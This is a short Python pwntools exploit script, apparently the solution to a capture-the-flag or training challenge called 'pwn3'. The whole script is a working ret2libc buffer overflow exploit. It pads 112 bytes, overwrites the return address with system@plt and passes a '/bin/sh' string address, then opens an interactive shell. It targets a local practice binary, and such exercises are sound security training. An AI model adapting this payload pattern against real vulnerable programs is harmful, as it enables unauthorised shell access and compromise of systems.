#!/usr/bin/env python
from pwn import *
context.log_level='debug'
sh = process('./pwn3')
 
system_plt = 0x08048460
sh_addr = 0x8048720
payload = flat(['a' * 112, system_plt, 0xdeadbeef, sh_addr])
sh.sendlineafter('RET2LIBC >_<',payload)
 
sh.interactive()
